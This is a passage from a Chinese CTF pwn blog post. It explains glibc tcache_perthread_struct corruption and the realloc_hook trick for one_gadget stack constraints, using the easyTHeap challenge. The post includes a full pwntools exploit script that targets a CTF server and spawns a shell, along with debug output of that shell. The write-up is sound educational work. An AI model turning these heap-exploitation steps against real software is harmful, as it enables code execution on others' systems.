Received <span class="number">0x5</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;size?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;16\n&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[DEBUG] Received <span class="number">0xc3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27; code\t        main_arena_offset-master       test1.c\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27; core\t        pwndbg-dev\t\t       vn_pwn_easyTHeap\n&#x27;</span></span><br><span class="line">    <span class="string">&quot; exp_debug.py  &#x27;tcache poisoning-glibc-2.29&#x27;   vn_pwn_easyTHeap_patch\n&quot;</span></span><br><span class="line">    <span class="string">&#x27; exp.py         test1\n&#x27;</span></span><br><span class="line"> code            main_arena_offset-master       test1.c</span><br><span class="line"> core            pwndbg-dev               vn_pwn_easyTHeap</span><br><span class="line"> exp_debug.py  <span class="string">&#x27;tcache poisoning-glibc-2.29&#x27;</span>   vn_pwn_easyTHeap_patch</span><br><span class="line"> exp.py         test1</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<h1 id="one-gadget-无法-getshell"><a href="#one-gadget-无法-getshell" class="headerlink" title="one_gadget 无法 getshell"></a>one_gadget 无法 getshell</h1><p>你可能会疑惑，直接向__malloc_hook 写入 one_gadget 不就好了吗？<br>但是有时候 one_gadget 不是万能的，无法 getshell，这是由于栈的问题所导致的，解决方法如下。</p>
<blockquote>
<p>这里偷个懒，直接粘贴别人的文章，侵删<br>还是以这个题目为例子<br>来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Theffth-blog/p/12790720.html">https://www.cnblogs.com/Theffth-blog/p/12790720.html</a></p>
</blockquote>
<h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>在堆题中，我们常见的一种泄露地址的方法是泄露<code>unsortedbin</code>中 chunk 的<code>fd</code>和<code>bk</code>，而在严格限制 chunk 大小的堆题中，如果有<code>tcache</code>机制的影响，我们必须需要先将<code>tcache Bin</code>填满，才能把 chunk 放入<code>unsortedbin</code>中，再进行地址泄露。于是，有些堆题会对<code>malloc</code>和<code>free</code>操作的次数设定限制，这时我们可以考虑伪造<code>tcache</code>机制的主体<code>tcache_perthread_struct</code>结构体。在源代码中对其定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="line">   the chunk is stored in the per-thread cache.  */</span><br><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line">/* There is one of these for each thread, which contains the</span><br><span class="line">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="line">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="line">   are redundant (we could have just counted the linked list each</span><br><span class="line">   time), this is for performance reasons.  */</span><br><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];     //数组counts用于存放每个bins中的chunk数量</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];   //数组entries用于放置64个bins</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>tcache_perthread_struct</code>结构体首先是类型为 char（一个字节）的 counts 数组，用于存放 64 个 bins 中的 chunk 数量，随后依次是对应 size 大小<code>0x20-0x410</code>的 64 个 entries（8 个字节），用于存放 64 个 bins 的 Bin 头地址，我写了如下非常简单的测试程序来具体看一看这个结构体：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr1,*ptr2,*ptr3;</span><br><span class="line">    ptr1=malloc(0x10);</span><br><span class="line">    ptr2=malloc(0x80);</span><br><span class="line">    ptr3=malloc(0x20);</span><br><span class="line">    free(ptr2);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    free(ptr1);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合调试：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178005-63be658b-d74a-4db7-8571-2c013036479c.png#align=left&display=inline&height=1111&margin=%5Bobject%20Object%5D&originHeight=1111&originWidth=2169&size=0&status=done&style=none&width=2169"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079177949-b8bd1dd3-7bd2-483f-ab8c-7bf5b1a805f9.png#align=left&display=inline&height=723&margin=%5Bobject%20Object%5D&originHeight=723&originWidth=2114&size=0&status=done&style=none&width=2114"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079177898-4ffe838b-2145-4cb8-aeee-a0d8c735aa80.png#align=left&display=inline&height=987&margin=%5Bobject%20Object%5D&originHeight=987&originWidth=1738&size=0&status=done&style=none&width=1738"><br>了解了这个结构体后，我们就可以具体利用了，下面结合一道例题进行进一步说明：<br>例题：buuoj – [V&amp;N2020 公开赛]easyTHeap<br>WP：<br>首先依然是 glibc2.26 下的环境，分析程序，主要有<code>add()</code> <code>edit()</code> <code>show()</code> <code>delete()</code>四个功能，可以看到，限制了最多进行 7 次添加操作，3 次删除操作。分析<code>add()</code>函数，看到对申请 chunk 的 size 进行了一定限制；分析<code>edit()</code>函数，发现通过 size 数组限制了写入字节数；分析<code>show()</code>函数，实现正常的显示功能，可利用来泄露地址；分析<code>delete()</code>函数，存在<code>UAF</code>漏洞，但是会将 size 数组清零，这意味着在<code>delete</code>堆块后便无法任意修改。所以我们的思路是，通过 tcache dup 泄露堆地址，随后通过 tcache poisoning，将 chunk 申请到堆基址，也即存放 tcache_perthread_struct 的地址，实现对结构体的伪造，即可实现把 chunk 放入 unsortedbin 以泄露地址，同时可以通过构造 entries 的内容，再次申请堆块到任意地址，进一步实现 getshell;<br>第一步，通过 tcache dup 泄露堆地址，这里需要多分配一个 chunk，以防止 chunk 0 释放后与 top chunk 的合并，由于连续两次释放 chunk，chunk 中的 fd 指针指向自身地址，可泄露堆基址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(0x80)#0</span><br><span class="line">add(0x10)#1 --&gt;</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">leak_addr=leak_address()</span><br><span class="line">print hex(leak_addr)</span><br><span class="line">heap_base=leak_addr-0x250-0x10</span><br><span class="line">log.info(&quot;heap_addr:&quot;+hex(heap_base))</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178087-672c7b76-63db-412e-b053-89181b0a4dcd.png#align=left&display=inline&height=1061&margin=%5Bobject%20Object%5D&originHeight=1061&originWidth=1793&size=0&status=done&style=none&width=1793"><br>第二步，tcache poisoning 申请 chunk 到 heap_base：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(0x80)#2-&gt;0</span><br><span class="line">#修改chunk0的fd</span><br><span class="line">edit(2,p64(heap_base+0x10))</span><br><span class="line">add(0x80)#3-&gt;0</span><br><span class="line">add(0x80)#4-&gt;heap_+0x10</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079177970-beb51b6d-8617-4a1f-b36c-342042f05bfb.png#align=left&display=inline&height=678&margin=%5Bobject%20Object%5D&originHeight=678&originWidth=2195&size=0&status=done&style=none&width=2195"><br>第三步，伪造 tcache_perthread_struct 结构体中的 counts 数组，这里我将其全部修改为上限 7，随后再次释放大小为 0x80 的 chunk 即可放入 unsortedbin 并泄露地址了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pd=&#x27;\x07&#x27;*64</span><br><span class="line">edit(4,pd)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">leak_addr=leak_address()</span><br><span class="line">print hex(leak_addr)</span><br><span class="line">libc_base=leak_addr-96-0x10-libc.sym[&#x27;__malloc_hook&#x27;]</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079177999-d2009860-1fd1-4ff4-b523-fedda194ed83.png#align=left&display=inline&height=1103&margin=%5Bobject%20Object%5D&originHeight=1103&originWidth=2314&size=0&status=done&style=none&width=2314"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178023-67485569-47a0-4f5d-8880-daf17dab3905.png#align=left&display=inline&height=1154&margin=%5Bobject%20Object%5D&originHeight=1154&originWidth=2184&size=0&status=done&style=none&width=2184"><br>第四步，通过修改结构体中 entries 数组的第一个内容，即 size=0x20 的 chunk 的 tcache Bin 头，再次申请 0x10 的 chunk 可以申请到指定地址的 chunk，实现任意地址写：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178122-4f96dc5e-28d8-4033-b81c-a28ec1b1fae3.png#align=left&display=inline&height=1128&margin=%5Bobject%20Object%5D&originHeight=1128&originWidth=2183&size=0&status=done&style=none&width=2183"><br>但是这里受次数限制我们不能写入 free_hook，checksec 查看可以看到<code>Full RELRO</code>保护开启，无法写入函数的 got 表，malloc 函数的参数又是我们自己写入的，无法写入<code>&#39;/bin/sh&#39;</code>字符串，所以我们只能向<code>malloc_hook</code>中写入 one_gadget 地址，但是这里将可用的 one_gadget 全部尝试后发现均不满足条件，于是我们必须利用<code>realloc——hook</code>，通过 libc 中<code>realloc</code>函数前一系列的抬栈操作来满足 one_gadget 可以使用的条件：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178131-3b750aae-210b-4c26-9051-4354b1e1848e.png#align=left&display=inline&height=1526&margin=%5Bobject%20Object%5D&originHeight=1526&originWidth=2560&size=0&status=done&style=none&width=2560"><br>同时<code>realloc_hook</code>与<code>malloc_hook</code>地址是连续的：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1607079178293-c00ab9a7-c128-407b-b915-40bf0604075e.png#align=left&display=inline&height=868&margin=%5Bobject%20Object%5D&originHeight=868&originWidth=2188&size=0&status=done&style=none&width=2188"><br>因此我们劫持程序流至<code>realloc_hook</code>地址处，可以同时向两个 hook 地址中任意写，我们只需向<code>realloc_hook</code>中写入 one_gadget，向<code>malloc_hook</code>中写入<code>realloc</code>地址加上适当的偏移（抬栈时 push 操作的次数不同，我们一般加上 8 即可），就可以在再次<code>malloc</code>时先去<code>realloc</code>函数处执行，抬栈后满足<code>one_gadget</code>的要求，再去执行<code>realloc_hook</code>中存放的<code>one_gadget</code>，进行 getshell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">realloc=libc_base+libc.sym[&#x27;__libc_realloc&#x27;]</span><br><span class="line">one_gadget=0x10a38c+libc_base</span><br><span class="line">edit(4,&#x27;\x07&#x27;*64+p64(malloc_hook-8))</span><br><span class="line">add(0x10)#5</span><br><span class="line">edit(5,p64(one_gadget)+p64(realloc+8))</span><br><span class="line">add(0x10)#6</span><br></pre></td></tr></table></figure>

<p>完整的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">binary_name=<span class="string">&#x27;./vn_pwn_easyTHeap&#x27;</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p=process(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line">    e=ELF(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line">    libc=e.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27084</span>)</span><br><span class="line">    e=ELF(<span class="string">&quot;./&quot;</span>+binary_name)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p,a)</span><br><span class="line">        <span class="keyword">if</span> a==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sd=<span class="keyword">lambda</span> x:p.send(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> a,b:p.sendlineafter(a,b)</span><br><span class="line">ia=<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_address</span>():</span></span><br><span class="line">    <span class="keyword">if</span>(context.arch==<span class="string">&#x27;i386&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">z(<span class="string">&#x27;b *0x555555554B6F\nb *0x555555554C90\nb *0x555555554D18\nb *0x555555554DA0\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#1 --&gt;</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_addr=leak_address()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak_addr)</span><br><span class="line">heap_base=leak_addr-<span class="number">0x250</span>-<span class="number">0x10</span></span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#2-&gt;0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#3-&gt;0</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#4-&gt;heap_+0x10</span></span><br><span class="line">pd=<span class="string">&#x27;\x07&#x27;</span>*<span class="number">64</span></span><br><span class="line">edit(<span class="number">4</span>,pd)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_addr=leak_address()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak_addr)</span><br><span class="line">libc_base=leak_addr-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">one_gadget=<span class="number">0x10a38c</span>+libc_base</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;\x07&#x27;</span>*<span class="number">64</span>+p64(malloc_hook-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#6</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cyberangel.cn/2020/12/02/PWN%E5%85%A5%E9%97%A8%EF%BC%883-18-1%EF%BC%89-Tcache%20Attack%E4%B8%AD%E7%9A%84tcache_perthread_struct%EF%BC%88%E5%9F%BA%E7%A1%80%E3%80%81%E4%BE%8B%E9%A2%98%EF%BC%89%EF%BC%88%E9%99%84%EF%BC%9A%E5%90%91__malloc_hook%E4%B8%AD%E5%86%99%E5%85%A5one_gadget%E6%97%A0%E6%B3%95getshell%E7%9A%84/">https://cyberangel.cn/2020/12/02/PWN入门（3-18-1）-Tcache Attack中的tcache_perthread_struct（基础、例题）（附：向__malloc_hook中写入one_gadget无法getshell的/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cyberangel.cn" target="_blank">Cyberangel-blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/05/PWN%E7%96%91%E9%9A%BE%EF%BC%881-1%EF%BC%89-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%AD%E6%A0%88%E5%81%8F%E7%A7%BB%E7%9A%84%E6%B5%8B%E9%87%8F%E6%96%B9%E6%B3%95%EF%BC%88x86%E3%80%81x64%EF%BC%89/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN疑难（1-1）-栈溢出中栈偏移的测量方法（x86、x64）</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/02/PWN%E5%85%A5%E9%97%A8%EF%BC%883-17-1%EF%BC%89-Tcache%20Attack%E4%B8%AD%E7%9A%84house%20of%20spirit%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN入门（3-17-1）-Tcache Attack中的house of spirit（基础）</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">Linux 环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4"><span class="toc-number">3.</span> <span class="toc-text">文件保护</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">IDA 静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sub-A39-%E2%80%93init"><span class="toc-number">4.1.</span> <span class="toc-text">sub_A39()–init</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sub-DCF-%E2%80%93menu"><span class="toc-number">4.2.</span> <span class="toc-text">sub_DCF()–menu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sub-9EA-%E2%80%93input-func"><span class="toc-number">4.3.</span> <span class="toc-text">sub_9EA()–input_func</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81sub-AFF-%E2%80%93add"><span class="toc-number">4.4.</span> <span class="toc-text">1、sub_AFF()–add</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81sub-BEA-%E2%80%93edit"><span class="toc-number">4.5.</span> <span class="toc-text">2、sub_BEA()–edit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81sub-CA4-%E2%80%93show"><span class="toc-number">4.6.</span> <span class="toc-text">3、sub_CA4()–show</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81sub-D2C-%E2%80%93delete"><span class="toc-number">4.7.</span> <span class="toc-text">4、sub_D2C()–delete</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-%E5%87%BD%E6%95%B0"><span class="toc-number">4.8.</span> <span class="toc-text">main 函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwndbg-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">5.</span> <span class="toc-text">pwndbg 动态调试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">6.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="toc-number">6.1.</span> <span class="toc-text">泄露堆地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Tcache-poisoning-%E6%8E%A7%E5%88%B6-tcache-perthread-struct"><span class="toc-number">6.2.</span> <span class="toc-text">利用 Tcache_poisoning 控制 tcache_perthread_struct</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7-tcache-perthread-struct-%E5%86%85%E5%AD%98"><span class="toc-number">6.3.</span> <span class="toc-text">申请 tcache_perthread_struct 内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-%E5%9C%B0%E5%9D%80"><span class="toc-number">6.4.</span> <span class="toc-text">泄露 libc 地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-%E7%9A%84%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">6.5.</span> <span class="toc-text">泄露 libc 的基地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 